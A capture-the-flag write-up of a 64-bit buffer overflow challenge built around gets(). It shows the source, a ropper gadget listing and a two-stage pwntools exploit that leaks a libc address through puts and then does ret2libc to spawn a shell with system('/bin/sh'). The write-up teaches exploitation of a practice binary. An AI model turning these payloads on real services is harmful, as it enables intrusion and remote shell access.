# Exploration
 We are given the following binary (i've patched it to use correct libc):  
 ![image](https://github.com/AndreQuimper/Writeups/assets/96965806/0193b05f-95e4-46b2-9b81-f6fb18636df1)  

 Checking binary security measures:  
 ![image](https://github.com/AndreQuimper/Writeups/assets/96965806/701f2e5d-4fac-4391-8426-8a829fc9b327)  
 We can also assume ASLR is on by default.  

 Let's check the source code and see if there is anything interesting  
 ```c
#include <stdio.h>

void sus(long s) {}

int main(void) {
  setbuf(stdout, NULL);
  long u = 69;
  puts("sus?");
  char buf[42];
  gets(buf);
  sus(u);
}
```

Hmm... very small and innocent looking isn't it?  
At a first glance `gets` >:(  
but also the `sus` function doesn't do anything.  
No `win` function so we need to get a shell somehow, and since NX is enabled then no shellcoding allowed.  
Probably a `ret2libc` challenge so since this is 64 bit we need to find a gadget to load our registers with the correct values  

Using ropper we can see where the `challenge` comes from:  
```
Gadgets
=======


0x0000000000401078: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f57]; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret;                                                                                                          
0x00000000004010ee: adc dword ptr [rax], edi; test rax, rax; je 0x3100; mov edi, 0x404028; jmp rax; 
0x000000000040107c: adc eax, 0x2f57; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x00000000004010ac: adc edi, dword ptr [rax]; test rax, rax; je 0x30c0; mov edi, 0x404028; jmp rax; 
0x000000000040111c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x30a0; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret;                                                                                                                     
0x0000000000401080: add ah, dh; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x000000000040107a: add bh, bh; adc eax, 0x2f57; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x000000000040100a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x0000000000401088: add byte ptr [rax], al; add byte ptr [rax], al; nop dword ptr [rax]; ret; 
0x00000000004010ae: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x30c0; mov edi, 0x404028; jmp rax;                                                                                                                         
0x00000000004010f0: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x3100; mov edi, 0x404028; jmp rax;                                                                                                                         
0x000000000040119d: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x000000000040119e: add byte ptr [rax], al; add cl, cl; ret; 
0x000000000040108a: add byte ptr [rax], al; nop dword ptr [rax]; ret; 
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x3012; call rax; 
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x3012; call rax; add rsp, 8; ret; 
0x00000000004010b0: add byte ptr [rax], al; test rax, rax; je 0x30c0; mov edi, 0x404028; jmp rax; 
0x00000000004010f2: add byte ptr [rax], al; test rax, rax; je 0x3100; mov edi, 0x404028; jmp rax; 
0x000000000040107f: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x000000000040119f: add byte ptr [rax], al; leave; ret; 
0x000000000040112b: add byte ptr [rcx], al; pop rbp; ret; 
0x00000000004011a0: add cl, cl; ret; 
0x0000000000401079: add dil, dil; adc eax, 0x2f57; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x0000000000401006: add eax, 0x2fd5; test rax, rax; je 0x3012; call rax; 
0x0000000000401006: add eax, 0x2fd5; test rax, rax; je 0x3012; call rax; add rsp, 8; ret; 
0x0000000000401013: add esp, 8; ret; 
0x0000000000401012: add rsp, 8; ret; 
0x0000000000401121: call 0x30a0; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret; 
0x0000000000401197: call 0x3146; mov eax, 0; leave; ret; 
0x000000000040107b: call qword ptr [rip + 0x2f57]; hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x0000000000401010: call rax; 
0x0000000000401010: call rax; add rsp, 8; ret; 
0x0000000000401002: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fd5; test rax, rax; je 0x3012; call rax; 
0x0000000000401149: in eax, 0x48; mov dword ptr [rbp - 8], edi; nop; pop rbp; ret; 
0x000000000040100e: je 0x3012; call rax; 
0x000000000040100e: je 0x3012; call rax; add rsp, 8; ret; 
0x00000000004010ab: je 0x30c0; mov eax, 0; test rax, rax; je 0x30c0; mov edi, 0x404028; jmp rax; 
0x00000000004010b5: je 0x30c0; mov edi, 0x404028; jmp rax; 
0x00000000004010ed: je 0x3100; mov eax, 0; test rax, rax; je 0x3100; mov edi, 0x404028; jmp rax; 
0x00000000004010f7: je 0x3100; mov edi, 0x404028; jmp rax; 
0x000000000040114c: jge 0x3146; nop; pop rbp; ret; 
0x00000000004010bc: jmp rax; 
0x0000000000401126: mov byte ptr [rip + 0x2f03], 1; pop rbp; ret; 
0x0000000000401145: mov dl, byte ptr [rbp + 0x48]; mov ebp, esp; mov qword ptr [rbp - 8], rdi; nop; pop rbp; ret; 
0x000000000040114b: mov dword ptr [rbp - 8], edi; nop; pop rbp; ret; 
0x00000000004010ad: mov eax, 0; test rax, rax; je 0x30c0; mov edi, 0x404028; jmp rax; 
0x00000000004010ef: mov eax, 0; test rax, rax; je 0x3100; mov edi, 0x404028; jmp rax; 
0x000000000040119c: mov eax, 0; leave; ret; 
0x0000000000401191: mov eax, dword ptr [rbp - 8]; mov rdi, rax; call 0x3146; mov eax, 0; leave; ret; 
0x0000000000401005: mov eax, dword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; 
0x0000000000401005: mov eax, dword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; add rsp, 8; ret; 
0x000000000040111f: mov ebp, esp; call 0x30a0; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret; 
0x0000000000401148: mov ebp, esp; mov qword ptr [rbp - 8], rdi; nop; pop rbp; ret; 
0x00000000004010b7: mov edi, 0x404028; jmp rax; 
0x0000000000401195: mov edi, eax; call 0x3146; mov eax, 0; leave; ret; 
0x000000000040114a: mov qword ptr [rbp - 8], rdi; nop; pop rbp; ret; 
0x0000000000401190: mov rax, qword ptr [rbp - 8]; mov rdi, rax; call 0x3146; mov eax, 0; leave; ret; 
0x0000000000401004: mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; 
0x0000000000401004: mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; add rsp, 8; ret; 
0x000000000040111e: mov rbp, rsp; call 0x30a0; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret; 
0x0000000000401147: mov rbp, rsp; mov qword ptr [rbp - 8], rdi; nop; pop rbp; ret; 
0x0000000000401194: mov rdi, rax; call 0x3146; mov eax, 0; leave; ret; 
0x0000000000401084: nop dword ptr [rax + rax]; nop dword ptr [rax]; ret; 
0x000000000040108c: nop dword ptr [rax]; ret; 
0x0000000000401083: nop dword ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x0000000000401082: nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x0000000000401003: or byte ptr [rax - 0x75], cl; add eax, 0x2fd5; test rax, rax; je 0x3012; call rax; 
0x00000000004010b6: or dword ptr [rdi + 0x404028], edi; jmp rax; 
0x000000000040112d: pop rbp; ret; 
0x000000000040111d: push rbp; mov rbp, rsp; call 0x30a0; mov byte ptr [rip + 0x2f03], 1; pop rbp; ret; 
0x0000000000401146: push rbp; mov rbp, rsp; mov qword ptr [rbp - 8], rdi; nop; pop rbp; ret; 
0x0000000000401042: ret 0x2f; 
0x000000000040100d: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004011a5: sub esp, 8; add rsp, 8; ret; 
0x0000000000401001: sub esp, 8; mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; 
0x00000000004011a4: sub rsp, 8; add rsp, 8; ret; 
0x0000000000401000: sub rsp, 8; mov rax, qword ptr [rip + 0x2fd5]; test rax, rax; je 0x3012; call rax; 
0x0000000000401086: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; nop dword ptr [rax]; ret; 
0x000000000040100c: test eax, eax; je 0x3012; call rax; 
0x000000000040100c: test eax, eax; je 0x3012; call rax; add rsp, 8; ret; 
0x00000000004010b3: test eax, eax; je 0x30c0; mov edi, 0x404028; jmp rax; 
0x00000000004010f5: test eax, eax; je 0x3100; mov edi, 0x404028; jmp rax; 
0x000000000040100b: test rax, rax; je 0x3012; call rax; 
0x000000000040100b: test rax, rax; je 0x3012; call rax; add rsp, 8; ret; 
0x00000000004010b2: test rax, rax; je 0x30c0; mov edi, 0x404028; jmp rax; 
0x00000000004010f4: test rax, rax; je 0x3100; mov edi, 0x404028; jmp rax; 
0x0000000000401193: clc; mov rdi, rax; call 0x3146; mov eax, 0; leave; ret; 
0x000000000040114d: clc; nop; pop rbp; ret; 
0x0000000000401081: hlt; nop word ptr cs:[rax + rax]; nop dword ptr [rax]; ret; 
0x00000000004011a1: leave; ret; 
0x000000000040114e: nop; pop rbp; ret; 
0x00000000004010bf: nop; ret; 
0x0000000000401016: ret; 

93 gadgets found
```
Can you spot it? There is no `pop rdi;` gadget in the program.
However, close inspection of the binary shows us this:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/6817718a-b3cc-473b-a20d-7344021c6338)  
The `u` variable is moved into `rdi` and since the `sus` function does not do anything, it will be there once `main` returns.
Therefore we can abuse `u` to pass function arguments to whatever function we return to.  

# Exploitation
Steps:  
1. leak memory to bypass ASLR
2. call system(/bin/sh)

We can use a pretty standard trick for PIE disabled binaries to leak aslr memory and then ROP back into the main function for our second stage exploitation  
```python
# STAGE 1: Leak memory 
# payload 56*a + function_param + 8*a (padding to return) + function + rop
payload = 56*b'A' + p64(exe.got['gets']) + 8*b'A' + p64(exe.plt['puts']) + p64(exe.sym.main)
io.sendline(payload)

print(io.recvline())
leak = io.recvline()
log.success(hex(int.from_bytes(leak[::-1])))
leak = int.from_bytes(leak[::-1])
leak = leak & 0xffffffffffff
log.success(hex(leak))

libc.address =  leak - libc.sym['gets']
log.success("Base of libc: " + hex(libc.address))
```

Then that we have bypassed aslr we can ret2libc  
```python
# STAGE 2: call system
# payload will call system('/bin/sh')

binsh = next(libc.search(b'/bin/sh'))
payload = 56*b'A' + p64(binsh) + 8*b'A' + p64(r.ret.address) + p64(libc.sym.system)
# needs stack alignment
#payload = 56*b'A' + p64(binsh) + 8*b'A' + p64(libc.sym.system)

io.sendline(payload)
```

Thats it :D  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c9175d95-4509-4067-a213-b971521a6102)



